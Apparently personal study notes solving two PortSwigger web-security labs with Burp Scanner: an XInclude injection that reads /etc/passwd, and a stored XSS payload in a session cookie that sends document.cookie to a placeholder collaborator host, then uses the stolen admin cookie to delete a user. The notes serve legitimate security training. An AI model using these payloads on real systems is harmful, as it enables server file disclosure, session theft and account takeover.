
#### 3.1. Lab: Discovering vulnerabilities quickly with targeted scanning ⭕️
This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of `/etc/passwd` within 10 minutes.

Due to the tight time limit, we recommend using Burp Scanner to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a [targeted scan on a specific request](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing#scanning-a-specific-request). Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.

1. Click on an item's View details > Check stock > inspect the `POST` request. Send the request to Repeater > add positions to `productId=$1$` and `storeId=$1$`. 
	1. ![[Extra Labs-20260127205644603.png]]
2. Notice an "Out-of-band resource load (HTTP)" issue.
	1. ![[Extra Labs-20260127205749828.png]]
	2. ![[Extra Labs-20260127205800948.png]]
3. Send that to Repeater > highlight the payload > and notice the `href` attribute. We can specify to display a file. Replace that with `file:///etc/passwd` > Send > and notice we get the contents of `/etc/passwd` back.
	1. ![[Extra Labs-20260127205900192.png]]
	2. ![[Extra Labs-20260127210049712.png]]
>If the payload doesn't work, maybe try a line break after `</foo>`
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

>[!tip] How to Identify this Vulnerability
>1. `POST` request like check stock
>2. Target scan reveal **Out-of-band resource load (HTTP)**

---
#### 1/2.2. Lab: Scanning non-standard data structures ⭕️
This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.

To solve the lab, use Burp Scanner's **Scan selected insertion point** feature to identify the vulnerability, then manually exploit it and delete `carlos`.

You can log in to your own account with the following credentials: `wiener:peter`

1. Login and notice the `GET /my-account?id=wiener` request has a session cookie with `wiener` in it. Followed by a colon (`%3a` = `:`) then a token of some kind. *This suggests that the server may treat the cookie as 2 inputs*.
	1. ![[Extra Labs-20260203211057914.png]]
2. Select `wiener` > right click > Scan selected insertion point
	1. ![[Extra Labs-20260203211235554.png]]
3. When the scan finished, you won't see the vulnerability yet. That's because if it's an out-of-band vulnerability, it takes burp collaborator a minute to poll. Wait for a minute or so.
	1. ![[Extra Labs-20260203212704690.png]]
>Even after a few minutes, the vuln didn't show up for me. If you see a duplicate, select that and scan it. Then wait a few minutes. Then the vulnerability should appear.
>![[Extra Labs-20260203213914689.png]]
4. Scanner found Stored XSS.
	1. ![[Extra Labs-20260203213826296.png]]
5. Use the payload below. Replace your burp collab payload (domain) and TOKEN. Send and get 500 error.
	1. ![[Extra Labs-20260203214448590.png]]
6. Poll burp collaborator and got a hit. Highlight it and Inspector show the decoded part.
	1. ![[Extra Labs-20260203214514392.png]]
	2. ![[Extra Labs-20260203214600435.png]]
7. Change to `GET /admin` and paste in the admin's cookie to get 200 OK. Change to `GET /admin/delete?username=carlos` to solve or paste the cookie into Cookie Editor > Admin panel > click delete carlos.
	1. ![[Extra Labs-20260203214648367.png]]

```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:TOKEN
```

#Stage1 Use this in Stage 1 to get a low-level user's session cookie.
#Stage2 Or this could be getting the admin's session 

>[!tip] How to Identify this Vulnerability
>Session cookie has username in it followed by `%3a`

---



